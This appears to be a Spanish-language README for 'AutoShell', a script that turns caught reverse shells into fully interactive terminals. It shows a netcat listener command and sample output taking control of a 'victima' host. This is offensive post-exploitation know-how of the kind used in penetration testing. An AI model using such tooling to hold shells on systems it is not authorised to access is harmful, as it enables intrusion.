# AutoShell 🚀

Herramienta para automatizar la mejora de shells inversas a TTY completamente interactivas con detección inteligente de entornos.

## 📦 Instalación

```bash
git clone https://github.com//Mayky23/AutoShell.git
cd AutoShell
chmod +x AutoShell.sh
```

## 🛠 Uso básico

```bash
# Modo básico
./AutoShell.sh <puerto>

# Especificar IP y puerto
./AutoShell.sh <ip> <puerto>
```

## 🌟 Ejemplo de uso

```bash
$ ./AutoShell.sh 4444
[*] Iniciando listener en 0.0.0.0:4444
[*] Comando: nc -lvnp 4444
[*] Esperando conexión...
connect to [192.168.1.10] from (UNKNOWN) [192.168.1.20] 55892
[+] Conexión establecida
[*] Estabilizando shell...
[+] Shell lista! Tomando control...

user@victima:/home$  # Shell completamente interactiva
```

## 🛡 Características clave

✔️ Autodetección de Python/alternativas

✔️ Soporte para IPv4/IPv6

✔️ Validación de parámetros robusta

✔️ Limpieza automática de recursos

✔️ Configuración óptima de terminal
